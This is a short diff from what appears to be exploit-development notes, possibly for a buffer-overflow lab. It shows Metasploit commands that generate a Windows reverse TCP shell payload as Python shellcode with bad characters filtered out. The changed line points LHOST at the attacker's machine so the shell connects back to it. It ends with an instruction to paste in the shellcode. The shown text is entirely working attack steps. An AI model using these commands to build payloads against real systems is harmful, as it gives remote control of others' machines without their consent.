@@ -69,7 +69,7 @@ ALMOST THERE, NOW IT'S TIME FOR THE SHELL CODE!!!!
 
 msfconsole
 use windows/shell_reverse_tcp
-set LHOST [WINDOWS DEVICE TO EXPLOIT]
+set LHOST LINOPS IP
 generate -b "\x00\x20\x0a\x0d" -f python
 
 COPY AND PASTE THE SHELL CODE 
